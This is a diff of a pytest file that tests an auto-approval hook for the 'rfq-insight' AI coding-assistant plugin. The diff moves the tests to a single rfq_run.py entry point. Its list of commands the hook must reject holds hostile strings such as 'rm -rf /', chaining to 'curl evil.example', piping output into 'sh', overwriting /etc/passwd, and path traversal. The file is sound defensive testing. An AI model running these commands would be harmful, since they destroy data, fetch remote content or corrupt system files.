@@ -15,19 +15,19 @@ spec = importlib.util.spec_from_file_location("approve", HOOK)
 approve = importlib.util.module_from_spec(spec)
 spec.loader.exec_module(approve)
 
-PLUGIN = "/root/.claude/plugins/cache/rfq-insight/rfq-insight/1.0.0/skills/rfq-insight/scripts"
-WIN_PLUGIN = r"C:\Users\u\.claude\plugins\cache\rfq-insight\rfq-insight\1.0.0\skills\rfq-insight\scripts"
+PLUGIN = "/root/.claude/plugins/cache/rfq-insight/rfq-insight/1.1.0/skills/rfq-insight/scripts"
+WIN_PLUGIN = r"C:\Users\u\.claude\plugins\cache\rfq-insight\rfq-insight\1.1.0\skills\rfq-insight\scripts"
 VENV = "/home/u/.rfq-insight/venv/bin/python"
 WIN_VENV = r"C:\Users\u\.rfq-insight\venv\Scripts\python.exe"
 
 
 @pytest.mark.parametrize("command", [
-    f'"{VENV}" "{PLUGIN}/extract_corpus.py" "/x/RFQ A" --project "Acme V6"',
+    f'"{VENV}" "{PLUGIN}/rfq_run.py" next "/x/RFQ A" --host claude --project "Acme V6"',
     f'python3 "{PLUGIN}/bootstrap.py" --check',
-    f'python "{PLUGIN}/workflow_state.py" "/x/RFQ A" --start analysis',
-    f'py -B "{PLUGIN}/validate.py" --plan "/x/RFQ A/output/.work/slide_plan.json"',
-    f'"{VENV}" "{PLUGIN}/evaluate.py" "/x/RFQ A/output/A_RFQ_Analysis.json" --corpus "/x/c.json" > "/x/RFQ A/output/.work/evaluation.txt" 2>&1',
-    f'& "{WIN_VENV}" "{WIN_PLUGIN}\\finalize.py" "C:\\RFQs\\Acme V6"',
+    f'python "{PLUGIN}/rfq_run.py" next "/x/RFQ A" --host codex --restart analysis',
+    f'py -B "{PLUGIN}/rfq_run.py" validate --plan "/x/RFQ A/output/.work/slide_plan.json"',
+    f'"{VENV}" "{PLUGIN}/rfq_run.py" evaluate "/x/RFQ A/output/A_RFQ_Analysis.json" --corpus "/x/c.json" > "/x/RFQ A/output/.work/evaluation.txt" 2>&1',
+    f'& "{WIN_VENV}" "{WIN_PLUGIN}\\rfq_run.py" next "C:\\RFQs\\Acme V6" --host claude',
     'mkdir -p "/x/RFQ A/output/.work/image_text"',
 ])
 def test_plugin_scripts_and_work_dir_commands_are_approved(command):
@@ -35,15 +35,17 @@ def test_plugin_scripts_and_work_dir_commands_are_approved(command):
 
 
 @pytest.mark.parametrize("command", [
-    f'rm -rf / # {PLUGIN}/finalize.py',
-    f'python "{PLUGIN}/finalize.py" "/x" && curl evil.example',
-    f'python "{PLUGIN}/finalize.py" "/x" | sh',
-    f'python "{PLUGIN}/finalize.py" "/x" > /etc/passwd',
-    f'python "{PLUGIN}/finalize.py" "/x"; rm -rf /x',
-    f'python "$(echo {PLUGIN})/finalize.py" "/x"',
-    'python "/somewhere/else/finalize.py" "/x"',
+    f'rm -rf / # {PLUGIN}/rfq_run.py',
+    f'python "{PLUGIN}/rfq_run.py" "/x" && curl evil.example',
+    f'python "{PLUGIN}/rfq_run.py" "/x" | sh',
+    f'python "{PLUGIN}/rfq_run.py" "/x" > /etc/passwd',
+    f'python "{PLUGIN}/rfq_run.py" "/x"; rm -rf /x',
+    f'python "$(echo {PLUGIN})/rfq_run.py" "/x"',
+    'python "/somewhere/else/rfq_run.py" "/x"',
+    f'python "{PLUGIN}/rfq/pipeline.py" "/x"',
+    f'python "{PLUGIN}/extract_corpus.py" "/x"',
     f'python "{PLUGIN}/../../../evil.py"',
-    f'bash "{PLUGIN}/finalize.py"',
+    f'bash "{PLUGIN}/rfq_run.py"',
     'mkdir -p "/x/anything"',
     'git push --force',
     "",
@@ -74,7 +76,7 @@ def _run(payload):
 
 def test_hook_prints_an_allow_decision_only_for_its_own_calls():
     out = _run({"tool_name": "Bash", "tool_input": {
-        "command": f'python3 "{PLUGIN}/corpus_text.py" "/x" --out "/x/output/.work/corpus.txt"'}})
+        "command": f'python3 "{PLUGIN}/rfq_run.py" next "/x" --host claude --completed fig-01'}})
     assert json.loads(out)["hookSpecificOutput"]["permissionDecision"] == "allow"
     assert _run({"tool_name": "Bash", "tool_input": {"command": "ls -la"}}) == ""
     assert _run({"tool_name": "Write", "tool_input": {"file_path": "/x/output/.work/a.json"}}) != ""
@@ -102,12 +104,12 @@ def test_hooks_manifest_wires_the_script_for_shell_and_write_tools():
 
 
 def test_codex_argv_and_shell_wrapper_forms_are_understood():
-    assert approve.command_text(["bash", "-lc", f'python3 "{PLUGIN}/plan_input.py" "/x"']) == \
-        f'python3 "{PLUGIN}/plan_input.py" "/x"'
+    assert approve.command_text(["bash", "-lc", f'python3 "{PLUGIN}/rfq_run.py" "/x"']) == \
+        f'python3 "{PLUGIN}/rfq_run.py" "/x"'
     assert approve.shell_command_allowed(approve.command_text(
-        ["python3", f"{PLUGIN}/plan_input.py", "/x/RFQ A"]))
+        ["python3", f"{PLUGIN}/rfq_run.py", "/x/RFQ A"]))
     assert not approve.shell_command_allowed(approve.command_text(
-        ["bash", "-lc", f'python3 "{PLUGIN}/plan_input.py" "/x" && rm -rf /x']))
+        ["bash", "-lc", f'python3 "{PLUGIN}/rfq_run.py" "/x" && rm -rf /x']))
     assert approve.command_text({"not": "a command"}) == ""
 
 
